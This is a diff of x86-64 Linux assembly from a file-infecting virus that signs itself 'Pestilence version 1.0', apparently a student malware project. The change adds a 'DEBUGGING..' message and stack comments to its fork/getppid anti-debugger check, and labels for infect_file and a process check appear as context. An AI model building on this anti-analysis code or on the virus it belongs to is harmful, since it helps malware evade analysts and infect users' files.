@@ -69,9 +69,15 @@ _start:
     cmp rax, 0
     je .pass_first_check
 
+    mov rdi, 1
+    mov rsi, msg_debug
+    mov rdx, 12
+    mov rax, 1
+    syscall                           ; write(1, "DEBUGGING..\n", 12)
+
     mov rax, 60
     mov rdi, 0
-    syscall
+    syscall                           ; exit(0)
 
     .pass_first_check:
     ; --------- Controllo se il processo cat è attivo ----------
@@ -323,6 +329,9 @@ infect_file:                          ; rdi = ptr nome file
 firma:
     db 'Pestilence version 1.0 (c)oded by usavoia-usavoia', 0x00
 
+msg_debug:
+    db 'DEBUGGING..', 0xA, 0x00
+
 strlen:
     mov rax, -1                       ;i = -1
     .loop:                            ;while
@@ -444,7 +453,12 @@ check_process:
 check_debug:
     sub rsp, 8                        ; res = 0
     sub rsp, 8                        ; status = 0
-
+    ; +----------------+---+
+    ; | stack funzione |   |
+    ; +----------------+---+
+    ; | status         | 8 |
+    ; | res            | 8 |
+    ; +----------------+---+
     mov rax, 57                       ; rax = fork()
     syscall
     cmp rax, 0                        ; if rax == 0
@@ -470,7 +484,13 @@ check_debug:
 
     .figlio:
         sub rsp, 8                    ; int ppid = 0
-
+        ; +----------------+---+
+        ; | stack funzione |   |
+        ; +----------------+---+
+        ; | ppid           | 8 |
+        ; | status         | 8 |
+        ; | res            | 8 |
+        ; +----------------+---+
         mov rax, 110
         syscall                       ; rax = getppid()
         mov [rsp], rax
